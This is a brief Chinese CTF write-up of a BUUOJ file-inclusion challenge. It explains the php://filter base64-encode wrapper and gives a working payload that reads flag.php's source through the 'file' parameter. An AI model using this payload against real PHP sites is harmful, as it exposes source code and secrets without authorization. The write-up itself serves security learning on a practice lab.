### buuoj_[ACTF2020 新生赛]include

打开界面查看源代码

![](https://pic.imgdb.cn/item/60f3d8185132923bf895f5f1.jpg)

看见有一句   ?file=flag.php

可以知道，本题目为文件包含，

点进去就蒙了，开心打出GG

看了大佬的wp，学到了一个伪协议读取文件

用伪协议读flag.php，一般语句为php://filter/read=convert.base64-encode/resource=xxx

    php:// 输入输出流
    php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写
    read=convert.base64-encode读出来的文件base64加密
    resource=xxx读取文件路径（相对绝对）
构造playload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

获得一串字符，进行base64解码即可

![](https://pic.imgdb.cn/item/60f3d9555132923bf8a1766f.jpg)